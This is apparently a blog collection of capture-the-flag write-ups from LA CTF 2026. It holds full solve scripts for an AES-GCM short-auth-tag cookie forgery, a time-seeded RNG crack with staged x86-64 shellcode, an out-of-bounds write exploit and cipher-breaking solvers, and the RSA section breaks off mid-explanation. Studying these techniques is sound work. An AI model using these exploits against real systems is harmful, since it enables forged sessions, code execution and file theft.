---
title: LA CTF 2026
date: 2026-02-10 00:01:00 +0800
categories: [Writeups, LA CTF]
tags: [ctf, web, pwn, crypto, rev, misc]
---

{% raw %}

# LA CTF 2026

A collection of my highlighted solutions from LA CTF 2026, organized by category.


## WEB

---


### [web] single-trust



> Exploit AES-GCM misuse by shrinking authentication to one byte, then bit-flip encrypted JSON to read `/flag.txt`.

### Overview

| Item | Value |
|------|-------|
| Platform | LA CTF |
| Event | LA CTF 2026 |
| Category | web |
| Difficulty | ★★★☆☆ |
| Date | 2026-02-07 |
| Flag | `lactf{4pl3tc4tion_s3curi7y}` |

### Problem Statement

> I was researching zero trust proofs in cryptography and now I have zero trust in JWT libraries so might roll my own.  
>  
> Turns out, Aplet123 was researching zero trust proofs (web/zero-trust) a few years ago in LA CTF 2023.  
>  
> I trust aplet so I'll just use his library (with his backdoor patched out).  
>  
> `diff single-trust/index.js zero-trust/index.js`  
>  
> `single-trust.chall.lac.tf`  
>  
> Note: the flag is in `/flag.txt`





Remote target:


### TL;DR

- The app stores auth state in an AES-256-GCM encrypted cookie: `auth=base64(iv).base64(tag).base64(ciphertext)`.
- Server accepts attacker-controlled auth tag length because it does not enforce a fixed length before `setAuthTag`.
- Live server accepted a **1-byte GCM tag**, reducing integrity from 128 bits to 8 bits.
- I modified ciphertext so decrypted JSON changed `tmpfile` from `/tmp/pastestore/...` to `/flag.txt`.
- Brute-forcing 256 possible 1-byte tags produced a valid forgery and returned the flag.

### Background Knowledge

#### AES-GCM in one sentence

AES-GCM gives:

- Confidentiality (CTR-like encryption)
- Integrity/authentication (GHASH authentication tag)

If integrity is weakened (for example, by accepting extremely short tags), forged ciphertext+tag pairs become practical.

#### Why bit-flipping works here

GCM encryption is stream-like for ciphertext generation (CTR mode), so for a known plaintext segment:

`C' = C xor P xor P'`

That lets us transform decrypted plaintext from `P` to chosen `P'` at matching positions without knowing the key.

#### Why this challenge is breakable

The server decrypts untrusted cookie data and trusts `user.tmpfile` as a ystem path:

- Reads on `/` route
- Writes on `/update` route

So once cookie forgery succeeds, we can point `tmpfile` to `/flag.txt` and get file read.

### Solution

#### Step 1: Initial Reconnaissance

Unpacked source and inspected key logic:

```bash
cd /home/archcat/Documents/CTF/lac_2026/web/single-trust/single-trust-src
nl -ba index.js | sed -n '23,75p'
```

Relevant output:

```js
23 function makeAuth(req, res, next) {
24   const iv = crypto.randomBytes(16);
25   const tmpfile = "/tmp/pastestore/" + crypto.randomBytes(16).toString("hex");
...
32   res.cookie("auth", [iv, authTag, ct].map((x) => x.toString("base64")).join("."));
...
44   const [iv, authTag, ct] = auth.split(".").map((x) => Buffer.from(x, "base64"));
45   const cipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
46   cipher.setAuthTag(authTag);
47   res.locals.user = JSON.parse(Buffer.concat([cipher.update(ct), cipher.final()]).toString("utf8"));
48   if (!fs.existsSync(res.locals.user.tmpfile)) {
...
66   fs.readync(res.locals.user.tmpfile, "utf8")
...
72   fs.writeync(res.locals.user.tmpfile, req.body.content.slice(0, 2048), "utf8");
```

Live cookie format check:

```bash
curl -sS -D - -o /tmp/st_page.html https://single-trust.chall.lac.tf/ | sed -n '1,12p'
```

Observed:

```http
set-cookie: auth=v096bp9Kv77xddIH%2FN28wA%3D%3D.AMkpcOabEh8MXSvG6qN%2Fpg%3D%3D.MIHLuL...
```

So cookie is URL-encoded base64 chunks separated by dots.

#### Step 2: Vulnerability Analysis

Main issue: the server does not enforce a strict tag length and accepts whatever arrives in cookie segment 2.

I tested acceptance by replaying a valid cookie while truncating the auth tag and checking whether server kept my cookie or replaced it.

Result from exploit script:

```text
[*] got auth cookie: iv=16B tag=16B ct=62B
[*] smallest accepted auth tag length: 1 byte(s)
```

A 1-byte GCM tag means only 256 possibilities, so forging becomes easy.

Next, we need decrypted JSON path control. Original JSON prefix is known:

```python
old = b'{"tmpfile":"/tmp/pastestore/'
new = b'{"tmpfile":"/flag.txt","a":"'
len(old), len(new)  # both 28
```

Using equal-length prefixes avoids shifting later bytes and keeps JSON parseable after controlled replacement.

#### Step 3: Exploit Development

Full exploit script (`solve.py` style), with comments:

```python
##!/usr/bin/env python3
import argparse
import base64
import sys
from urllib.parse import quote, unquote
import requests


OLD_PREFIX = b'{"tmpfile":"/tmp/pastestore/'
NEW_PREFIX = b'{"tmpfile":"/flag.txt","a":"'

def b64e(data: bytes) -> str:
    return base64.b64encode(data).decode()

def b64d(data: str) -> bytes:
    return base64.b64decode(data.encode())

def parse_auth(auth_cookie: str):
    # Express sends cookie value URL-encoded.
    auth_cookie = unquote(auth_cookie)
    iv_b64, tag_b64, ct_b64 = auth_cookie.split(".")
    return b64d(iv_b64), b64d(tag_b64), b64d(ct_b64)

def make_cookie(iv: bytes, tag: bytes, ct: bytes) -> str:
    raw = ".".join((b64e(iv), b64e(tag), b64e(ct)))
    # Re-encode for Cookie header compatibility.
    return quote(raw, safe=".")

def auth_was_accepted(resp: requests.Response) -> bool:
    # If server re-issues auth cookie, our supplied auth failed.
    return "auth=" not in resp.headers.get("Set-Cookie", "")

def detect_tag_len(base_url: str, iv: bytes, tag: bytes, ct: bytes, timeout: float):
    # Find smallest accepted tag length by replaying valid cookie with truncated tag.
    for n in range(1, min(16, len(tag)) + 1):
        cookie = make_cookie(iv, tag[:n], ct)
        resp = requests.get(
            base_url,
            headers={"Cookie": f"auth={cookie}"},
            timeout=timeout,
            allow_redirects=False,
        )
        if auth_was_accepted(resp):
            return n
    return None

def forge_ct(ct: bytes) -> bytes:
    # CTR-style bit flipping: C' = C xor P xor P'
    out = bytearray(ct)
    for i, (old, new) in enumerate(zip(OLD_PREFIX, NEW_PREFIX)):
        out[i] ^= old ^ new
    return bytes(out)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="https://single-trust.chall.lac.tf/")
    ap.add_argument("--timeout", type=float, default=8.0)
    args = ap.parse_args()

    # 1) Fetch a valid cookie.
    r = requests.get(args.url, timeout=args.timeout)
    auth = r.cookies.get("auth")
    if not auth:
        print("[!] no auth cookie received")
        return 1
    iv, tag, ct = parse_auth(auth)
    print(f"[*] got auth cookie: iv={len(iv)}B tag={len(tag)}B ct={len(ct)}B")

    # 2) Detect accepted tag length.
    n = detect_tag_len(args.url, iv, tag, ct, args.timeout)
    if not n:
        print("[!] no accepted tag length found")
        return 1
    print(f"[*] smallest accepted auth tag length: {n} byte(s)")

    # 3) Forge ciphertext to decrypt into tmpfile=/flag.txt JSON.
    forged_ct = forge_ct(ct)

    # 4) Brute-force tag space for accepted short length.
    total = 256 ** n
    print(f"[*] brute-forcing {total} possible tag values")
    for i in range(total):
        guess = i.to_bytes(n, "big")
        cookie = make_cookie(iv, guess, forged_ct)
        rr = requests.get(args.url, headers={"Cookie": f"auth={cookie}"}, timeout=args.timeout)
        if "lactf{" in rr.text:
            s = rr.text.index("lactf{")
            e = rr.text.find("}", s)
            print("[+] FLAG:", rr.text[s:e+1])
            return 0

    print("[!] brute-force failed")
    return 1

if __name__ == "__main__":
    sys.exit(main())
```

#### Step 4: Capturing the Flag

Run:

```bash
python single_trust_solve.py --url https://single-trust.chall.lac.tf/
```

Output:

```text
[*] got auth cookie: iv=16B tag=16B ct=62B
[*] smallest accepted auth tag length: 1 byte(s)
[*] brute-forcing 256 possible tag values
[+] FLAG: lactf{4pl3tc4tion_s3curi7y}
```

Flag:

```text
lactf{4pl3tc4tion_s3curi7y}
```

### Tools Used

| Tool | Purpose |
|------|---------|
| `curl` | Verify remote reachability, inspect headers/cookies |
| `python3` + `requests` | Implement and run exploitation logic |
| `sed` / `nl` | Source code inspection with line numbers |
| `rg` | Fast search through challenge  |

### Lessons Learned

#### What I Learned

- GCM is only as strong as tag validation policy; accepting tiny tags destroys integrity guarantees.
- “Patching the old bug” is not enough if cryptographic trust boundaries remain weak.
- Cookie URL-encoding details matter in real exploitation reliability.

#### Mistakes Made

- Initially followed the older 2023 bug path too literally before validating what still worked in this version.
- Lost time on connectivity when backend returned `503 no available server` during warm-up.

#### Future Improvements

- Add automated sanity checks for cookie transport encoding/decoding early in exploit scripts.
- Build a reusable “AEAD misuse” checklist for CTF web crypto challenges.
- Practice deriving equal-length plaintext rewrites faster for bit-flip attacks.

### References

- [Node.js Crypto API - `decipher.setAuthTag`](https://nodejs.org/api/crypto.html#deciphersetauthtagbuffer-encoding)
- [NIST SP 800-38D (GCM)](https://csrc.nist.gov/publications/detail/sp/800-38d/final)
- [LA CTF 2023 zero-trust challenge page](https://platform.2023.lac.tf/challs#:~:text=zero-trust)

### Tags

`web` `crypto-misuse` `aes-gcm` `cookie-forgery` `bit-flipping` `auth-tag-bruteforce` `file-read`


---


## PWN

---


### [pwn] ScrabASM



### Overview

| Attribute | Information |
|-----------|-------------|
| **Event** | LA CTF 2026 |
| **Category** | Pwn |
| **Points** | Unknown |
| **Difficulty** | Medium |
| **Solves** | Unknown |
| **Author** | Unknown |

### Problem Statement

The challenge provides a binary that simulates a "Scrabble" game where tiles are bytes.
We are given a hand of 14 random bytes. We can:
1.  **Swap a tile**: Replaces a byte at a specific index with a new random byte (`rand() & 0xFF`).
2.  **Play**: Copies the 14 bytes to a fixed memory address (`0x13370000`) with `RWX` permissions and executes them.

The goal is to construct a valid shellcode within the 14-byte constraint by manipulating the random number generator, then execute it to retrieve the flag.

**Connection:** `nc chall.lac.tf 31338`
**** `chall`, `chall.c`, `Dockerfile`

### TL;DR

*   **Vulnerability:** The random number generator is seeded with `srand(time(NULL))`, making the sequence predictable.
*   **Exploit:**
    1.  Connect to the server and retrieve the initial hand.
    2.  Crack the RNG seed by brute-forcing timestamps around the current server time.
    3.  Simulate the server's RNG state locally to determine the sequence of future random bytes.
    4.  Construct a 14-byte "Stage 1" shellcode by selectively swapping tiles when the next random byte matches a byte needed for the shellcode.
    5.  "Stage 1" shellcode executes a `read` syscall to overwrite itself with a larger "Stage 2" payload.
    6.  "Stage 2" payload performs an Open-Read-Write (ORW) chain to read `flag.txt`.

### Background Knowledge

#### Predictable RNG in C
In C, `rand()` generates pseudo-random numbers. If `srand()` is called with a predictable seed (like the current time in seconds), the entire sequence of numbers can be reproduced by an attacker who knows the approximate time the seed was generated.

#### Shellcode Constraints
Writing shellcode in a limited space (14 bytes) is challenging.
*   **x86_64 Calling Convention:** Arguments are passed in `rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`. System call number is in `rax`.
*   **IBT (Indirect Branch Tracking):** Modern systems often enable IBT, which requires indirect jumps (like `call *%rax`) to land on an `endbr64` instruction (`f3 0f 1e fa`). This consumes 4 of our 14 bytes, leaving only 10 bytes for logic.

#### Open-Read-Write (ORW)
Some challenges restrict `execve` (spawning a shell) via seccomp or other means. In such cases, we must use `open` to open the flag file, `read` to read its content into memory, and `write` to print it to stdout.

### Solution

#### Step 1: Reconnaissance

We start by analyzing the source code (`chall.c`). The `main` function initializes the game:

```c
srand(time(NULL));

unsigned char hand[HAND_SIZE]; // HAND_SIZE = 14
for (int i = 0; i < HAND_SIZE; i++)
    hand[i] = rand() & 0xFF;
```

The `play` function maps memory and executes the hand:

```c
##define BOARD_ADDR 0x13370000UL

void play(unsigned char *hand) {
    void *board = mmap((void *)BOARD_ADDR, BOARD_SIZE,
                       PROT_READ | PROT_WRITE | PROT_EXEC, ...);
    memcpy(board, hand, HAND_SIZE);
    ((void (*)(void))board)();
}
```

The memory is `RWX` (Read-Write-Execute), so we can execute code. The challenge is constructing meaningful code using only `rand()` bytes.

#### Step 2: Seed Cracking & RNG Manipulation

Since `srand(time(NULL))` is used, we can find the seed by brute-forcing timestamps.
We retrieve the initial 14-byte hand from the server. Then, locally, we try `srand(t)` for `t` in `range(now - 1000, now + 1000)`. If the generated sequence matches the server's hand, we found the seed.

Once we have the seed, we can predict the *next* byte `rand()` will produce.
We want to transform our current random hand into a target shellcode.
*   **Target:** A specific 14-byte sequence.
*   **Mechanism:** If the next random byte matches a byte we need at index `i` (and index `i` is currently wrong), we swap index `i`. Otherwise, we swap a "garbage" index just to consume the random number and move to the next one.

#### Step 3: Exploit Development

##### Stage 1 Shellcode (14 bytes)

We need to execute `read(0, 0x13370000, 255)` to load a larger payload.
Constraint: Must start with `endbr64` (4 bytes).
Remaining space: 10 bytes.

Assembly construction:
```assembly
; 0-3: IBT requirement
endbr64             ; f3 0f 1e fa 

; 4-13: read(0, 0x13370000, 255)
; At this point, RAX holds the function address (0x13370000)
xchg rsi, rax       ; 48 96       -> RSI = 0x13370000
xor edi, edi        ; 31 ff       -> RDI = 0 (stdin)
xor eax, eax        ; 31 c0       -> RAX = 0 (SYS_read)
mov dl, 0xff        ; b2 ff       -> RDX = 255
syscall             ; 0f 05       -> Trigger syscall
```
Total: 14 bytes.

The `read` syscall will wait for input and overwrite the memory at `0x13370000`. The CPU is currently executing at `0x13370000 + 14` (instruction pointer moves after syscall). So we must pad our input so the new code aligns correctly or simply append the new code. Since `read` overwrites from the beginning, and we are at offset 14, we send 14 bytes of padding followed by Stage 2.

##### Stage 2 Shellcode (ORW)

We use `pwntools` or manual assembly to write an ORW chain for `flag.txt`.

```python
shellcode = asm("""
    /* open("flag.txt", 0) */
    push 0
    mov rbx, 0x7478742e67616c66 ; "flag.txt"
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    mov rax, 2
    syscall

    /* read(fd, buf, 100) */
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    xor rax, rax
    syscall

    /* write(1, buf, 100) */
    mov rdi, 1
    mov rax, 1
    syscall
""")
```

#### Step 4: Final Exploit Script

```python
from pwn import *
import ctypes
import time


libc = ctypes.CDLL("libc.so.6")



shellcode_stage1 = b"\xf3\x0f\x1e\xfa\x48\x96\x31\xff\x31\xc0\xb2\xff\x0f\x05"
target = list(shellcode_stage1)

def get_initial_hand(p):
    p.recvuntil(b"Your starting tiles:\n")
    lines = p.recvuntil(b"    1) Swap a tile").decode().split('\n')
    for line in lines:
        if line.strip().startswith('|') and " | " in line:
            parts = line.strip().split('|')
            hex_vals = [x.strip() for x in parts if x.strip() and x.strip() != '+']
            if len(hex_vals) == 14:
                return [int(x, 16) for x in hex_vals]
    return []

def solve():
    context.arch = 'amd64'
    p = remote('chall.lac.tf', 31338)

    # 1. Crack Seed
    initial_hand = get_initial_hand(p)
    now = int(time.time())
    seed = None
    for t in range(now - 1000, now + 1000):
        libc.srand(t)
        if [libc.rand() & 0xFF for _ in range(14)] == initial_hand:
            seed = t
            break
            
    if seed is None:
        log.error("Seed not found")
        return
        
    log.success(f"Found seed: {seed}")
    
    # 2. Construct Hand
    libc.srand(seed)
    for _ in range(14): libc.rand() # Consume initial hand

    current_hand = list(initial_hand)
    swaps = []
    sim_hand = list(current_hand)
    
    # Greedy simulation to match target
    while sim_hand != target:
        next_val = libc.rand() & 0xFF
        swap_idx = -1
        # Try to match a needed byte
        for i in range(14):
            if sim_hand[i] != target[i] and target[i] == next_val:
                swap_idx = i
                break
        # Else burn a byte
        if swap_idx == -1:
            for i in range(14):
                if sim_hand[i] != target[i]:
                    swap_idx = i
                    break
        if swap_idx == -1: break
        swaps.append(swap_idx)
        sim_hand[swap_idx] = next_val

    log.info(f"Swaps needed: {len(swaps)}")

    # Send swaps in chunks
    chunk_size = 500
    for i in range(0, len(swaps), chunk_size):
        payload = ""
        for idx in swaps[i:i+chunk_size]:
            payload += f"1\n{idx}\n"
        p.send(payload.encode())
        time.sleep(0.5)
    
    time.sleep(2)
    p.clean()

    # 3. Play & Send Stage 2
    p.sendline(b"2")
    p.recvuntil(b"Playing your word...")
    
    stage2 = asm(shellcraft.cat('flag.txt'))
    payload = b"\x90"*14 + stage2
    p.send(payload)
    
    print(p.recvall(timeout=5).decode(errors='ignore'))

if __name__ == "__main__":
    solve()
```

#### Step 5: Flag Capture

```bash
[+] Opening connection to chall.lac.tf on port 31338: Done
[+] Found seed: 1770430658
[*] Swaps needed: 1407
[+] Stage 1 Executed!
[+] Receiving all data: Done (125B)
lactf{gg_y0u_sp3ll3d_sh3llc0d3}
```

### Tools Used

| Tool | Purpose |
|------|---------|
| `pwntools` | Interaction, shellcode generation, and exploitation script. |
| `ctypes` | Loading `libc` to use `srand`/`rand` in Python. |
| `objdump` | Disassembling the binary to check for IBT (`endbr64`) and gadget offsets. |
| `checksec` | Identifying security protections (NX, PIE). |

### Lessons Learned

1.  **Time-Seeded RNGs are Vulnerable:** Never use `time(NULL)` for security-critical randomness. It's trivial to predict.
2.  **Compact Shellcoding:** When space is tight (14 bytes), every byte counts. Using `xchg` instead of `mov` can save bytes. Reusing register values (like `rax` holding the buffer address) is crucial.
3.  **IBT Awareness:** Always check for `endbr64` requirements on modern challenges. If the program crashes immediately upon jumping to your shellcode, it might be a missing `endbr64`.
4.  **Staged Payloads:** If the initial injection vector is too small, use it to read a larger payload (Stage 2) into executable memory.

### References

*   [Linux System Call Table (x86_64)](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)
*   [Pwntools Documentation](https://docs.pwntools.com/en/stable/)

### Tags

`pwn` `shellcode` `rng-cracking` `orw` `staged-exploitation` `x86_64`


---


### [pwn] tic-tac-no



### Challenge Description
**Category:** Pwn  
**Objective:** Beat the "perfect" AI in Tic-Tac-Toe to get the flag.  
**** `chall`, `chall.c`, `Dockerfile`

### Analysis

We are provided with a 64-bit ELF executable and its source code. The game implements a standard Tic-Tac-Toe against a computer opponent using the Minimax algorithm, which generally ensures the computer plays perfectly (making it impossible to beat purely by playing logic).

#### Code Review (`chall.c`)

The global variables are defined as follows:
```c
char board[9];
char player = 'X';
char computer = 'O';
```

The core vulnerability lies in the `playerMove` function:

```c
void playerMove() {
   int x, y;
   do{
      printf("Enter row #(1-3): ");
      scanf("%d", &x);
      printf("Enter column #(1-3): ");
      scanf("%d", &y);
      int index = (x-1)*3+(y-1);
      
      // VULNERABILITY HERE
      if(index >= 0 && index < 9 && board[index] != ' '){
         printf("Invalid move.\n");
      }else{
         board[index] = player; // OOB Write
         break;
      }
   }while(1);
}
```

The logic inside the `if` statement is flawed. It checks:
1. Is index valid? (`>= 0 && < 9`)
2. AND is the spot occupied?

If the user provides coordinates that result in a negative index (e.g., Row -6, Col -1), the first condition `index >= 0` fails. This makes the entire `if` condition **false**, causing execution to fall through to the `else` block, which performs the write:
`board[index] = player;`

This allows us to write 'X' (the player's symbol) to arbitrary memory locations relative to the `board` array.

### Exploitation

#### Target Selection
We need to win the game to get the flag:
```c
if (winner == player) { ... print flag ... }
```
Since the AI is perfect, we can't win by playing normally. However, we can corrupt the game state.
If we can overwrite the `computer` variable (which holds 'O') with 'X', the computer will effectively start playing for *our* team.

#### Offset Calculation
Using `nm` to find symbol addresses:
```bash
nm chall | grep -E "board|player|computer"
0000000000004068 B board
0000000000004051 D computer
0000000000004050 D player
```

* Address of `board`: `0x4068`
* Address of `computer`: `0x4051`

We want `board[index]` to point to `computer`.
`&board[0] + index = &computer`
`0x4068 + index = 0x4051`
`index = 0x4051 - 0x4068`
`index = -23`

Now we need input values (Row `x`, Col `y`) such that:
`(x-1)*3 + (y-1) = -23`

Let's pick a value for `x`:
Try `x = -6`:
`(-6 - 1) * 3 = -21`
`-21 + (y - 1) = -23`
`y - 1 = -2`
`y = -1`

So, **Row: -6, Col: -1** gives us index -23.

#### The Attack
1. Start the game.
2. When asked for a move, input **Row: -6, Col: -1**.
3. This overwrites `computer` variable with 'X'.
4. Now both `player` and `computer` are 'X'.
5. Any subsequent move by the computer (or us) will place 'X's on the board.
6. The board will quickly fill with 'X's, triggering the win condition for 'X' (Player).
7. The game prints the flag.

### Solve Script

```python
from pwn import *



def solve():
    # p = process('./chall')
    p = remote('chall.lac.tf', 30001)

    # 1. Overwrite 'computer' variable ('O') with 'X'
    # Offset calculation: 
    # board @ 0x4068, computer @ 0x4051. Diff = -23.
    # index = (row-1)*3 + (col-1)
    # -23 = (-6-1)*3 + (-1-1) -> Row: -6, Col: -1
    
    p.sendlineafter(b"Enter row #(1-3): ", b"-6")
    p.sendlineafter(b"Enter column #(1-3): ", b"-1")

    # 2. Play standard moves to let the game finish
    # Since computer is now 'X', it will help us win immediately.
    try:
        p.sendlineafter(b"Enter row #(1-3): ", b"1")
        p.sendlineafter(b"Enter column #(1-3): ", b"2")
        p.sendlineafter(b"Enter row #(1-3): ", b"2")
        p.sendlineafter(b"Enter column #(1-3): ", b"1")
    except:
        pass

    # 3. Read flag
    print(p.recvall(timeout=2).decode(errors='ignore'))

if __name__ == "__main__":
    solve()
```

**Flag:** `lactf{th3_0nly_w1nn1ng_m0ve_1s_t0_p1ay}`


---


## CRYPTO

---


### [crypto] not-so-lazy-trigrams



### Challenge prompt

> Finally got the energy to write a trigram substitution cipher. Surely three shuffles are better than one!

Given 


- `solver.py` (partial/incorrect attempt)

 is `lactf{...}`.

---

### 1) Initial analysis

From `chall.py`, the important lines are:

```python
trigrams = [chr(i)+chr(j)+chr(k) for i in range(97,97+26) for j in range(97,97+26) for k in range(97,97+26)]
shufflei = random.sample(range(97,97+26),26)
shufflej = random.sample(range(97,97+26),26)
shuffelk = random.sample(range(97,97+26),26)
sub_trigrams = [chr(i)+chr(j)+chr(k) for i in shufflei for j in shufflej for k in shuffelk]
```

This is the key weakness.

If this were a true random trigram substitution, `sub_trigrams` would be a random permutation of all 26^3 trigrams.

But here it is a **cartesian product of three independent shuffled alphabets**.

So for plaintext trigram `(p0, p1, p2)`, encryption is:

- position 0 uses substitution `S0`
- position 1 uses substitution `S1`
- position 2 uses substitution `S2`

In other words:

`E(p0 p1 p2) = S0(p0) S1(p1) S2(p2)`

So this is effectively just **three monoalphabetic substitutions interleaved by index mod 3**, not a 17576-symbol substitution.

Also, `formatter()` removes spaces but keeps punctuation (except spaces), which is why ciphertext is one long stream of letters with punctuation still visible.

---

### 2) Reduction to 3 substitution ciphers

Take only alphabetic chars from `ct.txt`; call their global index `idx`.

- if `idx % 3 == 0` -> stream 0 -> substitution `S0`
- if `idx % 3 == 1` -> stream 1 -> substitution `S1`
- if `idx % 3 == 2` -> stream 2 -> substitution `S2`

Because  is known (`lactf{`), the ciphertext ending `zjlel{...}` immediately gives anchors:


That greatly stabilizes automated solving.

---

### 3) Automated solve approach

I used quadgram scoring + simulated annealing hillclimb:

1. Build English quadgram model (from Gutenberg texts).
2. Initialize each stream substitution by frequency mapping.
3. Repeatedly swap two plaintext assignments within one stream (`S0`/`S1`/`S2`), keeping anchored flag mappings fixed.
4. Accept better scores, occasionally accept worse (Metropolis criterion) to escape local optima.
5. Keep best global key.

This recovered almost perfect plaintext, with only tiny ambiguity (`k/z` style swap) solved by context:


The plaintext is a chunk of Wikipedia text about circular polarizers, followed by the flag.

---

### 4) Minimal solver (cleaned)

```python
import re, random, math, urllib.request
from collections import Counter

ct = open("ct.txt").read().strip()
alpha = [ord(c)-97 for c in ct if c.isalpha()]
stream = [i % 3 for i in range(len(alpha))]


urls = [
    "https://www.gutenberg.org//1342/1342-0.txt",
    "https://www.gutenberg.org//11/11-0.txt",
]
corpus = ""
for u in urls:
    t = urllib.request.urlopen(u, timeout=20).read().decode("utf-8", "ignore")
    corpus += re.sub("[^a-zA-Z]", "", t).lower()

q = Counter(corpus[i:i+4] for i in range(len(corpus)-3))
Q = sum(q.values())
floor = math.log10(0.01 / Q)
tbl = [floor] * (26**4)
for g, c in q.items():
    a, b, c1, d = [ord(x)-97 for x in g]
    tbl[((a*26+b)*26+c1)*26+d] = math.log10(c / Q)


fixed = [dict(), dict(), dict()]
fixed[0][ord("z")-97] = ord("l")-97
fixed[1][ord("j")-97] = ord("a")-97
fixed[2][ord("l")-97] = ord("c")-97
fixed[0][ord("e")-97] = ord("t")-97
fixed[1][ord("l")-97] = ord("f")-97


freq = [Counter(), Counter(), Counter()]
for c, s in zip(alpha, stream):
    freq[s][c] += 1
en = [ord(c)-97 for c in "etaoinshrdlcumwfgypbvkjxqz"]

def init_key():
    key = []
    for s in range(3):
        m = [None] * 26
        used = set()
        for ci, pi in fixed[s].items():
            m[ci] = pi
            used.add(pi)
        c_order = [c for c, _ in freq[s].most_common() if c not in fixed[s]]
        p_order = [p for p in en if p not in used]
        for ci, pi in zip(c_order, p_order):
            m[ci] = pi
            used.add(pi)
        rem = [p for p in range(26) if p not in used]
        random.shuffle(rem)
        for i in range(26):
            if m[i] is None:
                m[i] = rem.pop()
        key.append(m)
    return key

positions = [[[ ] for _ in range(26)] for _ in range(3)]
for i, (c, s) in enumerate(zip(alpha, stream)):
    positions[s][c].append(i)

plain = [0] * len(alpha)

def fill_plain(key):
    for i, c in enumerate(alpha):
        plain[i] = key[stream[i]][c]

def score_plain():
    t = 0.0
    a, b, c, d = plain[0], plain[1], plain[2], plain[3]
    t += tbl[((a*26+b)*26+c)*26+d]
    for i in range(4, len(plain)):
        a, b, c, d = b, c, d, plain[i]
        t += tbl[((a*26+b)*26+c)*26+d]
    return t

def decode_full(key):
    out, ai = [], 0
    for ch in ct:
        if ch.isalpha():
            out.append(chr(key[ai % 3][ord(ch)-97] + 97))
            ai += 1
        else:
            out.append(ch)
    return "".join(out)

nonfix = [[i for i in range(26) if i not in fixed[s]] for s in range(3)]
best_score = -1e99
best_key = None

for _ in range(30):
    key = init_key()
    fill_plain(key)
    cur = score_plain()
    T = 6.0
    for _ in range(12000):
        s = random.randrange(3)
        a, b = random.sample(nonfix[s], 2)
        pa, pb = key[s][a], key[s][b]

        key[s][a], key[s][b] = pb, pa
        for p in positions[s][a]: plain[p] = pb
        for p in positions[s][b]: plain[p] = pa

        new = score_plain()
        d = new - cur
        if d > 0 or random.random() < math.exp(d / max(T, 1e-9)):
            cur = new
            if cur > best_score:
                best_score = cur
                best_key = [k[:] for k in key]
        else:
            key[s][a], key[s][b] = pa, pb
            for p in positions[s][a]: plain[p] = pa
            for p in positions[s][b]: plain[p] = pb

        T *= 0.9996

print(decode_full(best_key))
```

---

### 5) Final flag

`lactf{still_too_lazy_to_write_a_plaintext_so_heres_a_random_wikipedia_article}`


---


### [crypto] six seven again


> Factoring RSA where 2/3 of prime p's digits are known.

### Overview

| Field | Value |
|-------|-------|
| Challenge | six seven again |
| Category | Crypto |
| Platform | LA CTF 2026 |
| Points | N/A |
| Solves | N/A |
| Level | Hard |

### Problem Statement
We are given an RSA modulus $n$ and ciphertext $c$. The challenge is to factor $n = p \times q$ to decrypt the flag.
The prime $p$ has a peculiar structure with 201 decimal digits:
- **Positions 0-66 (Lower 1/3)**: All digits are '7'.
- **Positions 67-133 (Middle 1/3)**: Each digit is either '6' or '7'.
- **Positions 134-200 (Upper 1/3)**: All digits are '6'.

The prime $q$ is a standard random 670-bit prime.

****
- `chall.py`: Generation script showing the structure.


### TL;DR
- The prime $p$ has 201 digits, and we know the top 67 and bottom 67 digits.
- Only the middle 67 digits are unknown (random choice of '6' or '7').
- This is a classic **Partial Key Exposure** scenario.
- We model the unknown middle part as a small root of a polynomial modulo $p$.
- Used **SageMath's `small_roots`** (Coppersmith's method) to find the middle digits.
- Recovered $p$, factored $n$, and decrypted the flag.

### Background Knowledge

#### RSA Partial Key Exposure
RSA security relies on $p$ and $q$ being secret. If a significant fraction of the bits of $p$ are known, we can recover the rest.
Coppersmith's method allows finding small roots of polynomial equations modulo a divisor of $n$.
Specifically, if we have an approximation $P$ of $p$ such that $|p - P| < N^{1/4}$, we can factor $N$ efficiently.

#### Coppersmith's Method with SageMath
SageMath provides a `small_roots` method for polynomials over $\mathbb{Z}_n$.
If we construct a polynomial $f(x)$ such that $f(x_0) \equiv 0 \pmod p$ for a small $x_0$, `small_roots` can find $x_0$.
The condition usually requires the root to be smaller than $N^{\beta^2}$, where $p \approx N^\beta$.
For balanced RSA, $\beta=0.5$, so we can find roots up to $N^{0.25}$.

### Solution Step 1: Initial Reconnaissance
We inspect `chall.py` to understand the prime generation:

```python
def generate_super_67_prime() -> int:
    while True:
        digits = ["6"] * 67
        digits += [secrets.choice("67") for _ in range(67)]
        digits += ["7"] * 67
        test = int("".join(digits))
        if isPrime(test): return test
```

This confirms the structure:
- **High part**: $66\dots6$ ($67$ times) $\times 10^{134}$
- **Low part**: $77\dots7$ ($67$ times)
- **Middle part**: Unknown mix of 6s and 7s.

Total digits of $p \approx 201$.
Bits of $p \approx 201 \times \log_2(10) \approx 667$ bits.
Bits of $q = 670$ bits.
Total bits of $n \approx 1337$.

### Solution Step 2: Vulnerability Analysis
We can express $p$ as:
$$p = P_{\text{high}} + \text{Middle} \cdot 10^{67} + P_{\text{low}}$$

Let's assume the "base" value for the middle part is all '6's.
Then the actual middle part is:
$$\text{Middle} = \underbrace{66\dots6}_{\text{all 6s}} + \delta$$
where $\delta$ consists of digits 0 and 1 (adding 1 turns a 6 into a 7).

Substituting this into $p$:
$$p = P_{\text{high}} + (66\dots6 + \delta) \cdot 10^{67} + P_{\text{low}}$$
$$p = \underbrace{(P_{\text{high}} + 66\dots6 \cdot 10^{67} + P_{\text{low}})}_{P_{\text{base}}} + \delta \cdot 10^{67}$$

So:
$$p = P_{\text{base}} + \delta \cdot 10^{67}$$

We know $P_{\text{base}}$ entirely. We only need to find $\delta$.
The maximum value of $\delta$ is when all digits are 1:
$$\delta_{\text{max}} \approx \underbrace{11\dots1}_{67 \text{ times}} \approx \frac{10^{67}}{9} \approx 1.1 \times 10^{66}$$

Check Coppersmith bounds:
$N \approx 10^{403}$.
Root bound $X \approx 10^{67}$.
$N^{1/4} \approx 10^{100}$.
Since $X < N^{1/4}$, Coppersmith's method is applicable!

### Solution Step 3: Exploit Development
We use SageMath to define the polynomial:
$$f(x) = P_{\text{base}} + x \cdot 10^{67} \pmod n$$
We look for a root $x_0 = \delta$ such that $f(x_0) \equiv 0 \pmod p$.

**Implementation Details:**
- One catch: `small_roots` requires the polynomial to be **monic** (leading coefficient 1).
